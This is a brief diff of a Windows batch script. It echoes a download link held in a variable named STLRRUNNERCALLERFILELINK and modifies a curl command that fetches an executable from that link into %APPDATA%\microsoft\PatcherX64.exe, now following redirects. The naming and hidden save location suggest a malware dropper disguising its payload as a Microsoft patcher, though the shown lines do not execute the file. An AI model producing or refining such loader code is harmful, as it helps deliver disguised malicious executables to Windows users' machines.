@@ -17,7 +17,7 @@ echo.
 echo STLRRUNNERCALLERFILELINK=%STLRRUNNERCALLERFILELINK%
 echo.
 
-curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%STLRRUNNERCALLERFILELINK%"
+curl -L -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%STLRRUNNERCALLERFILELINK%"
 
 
 
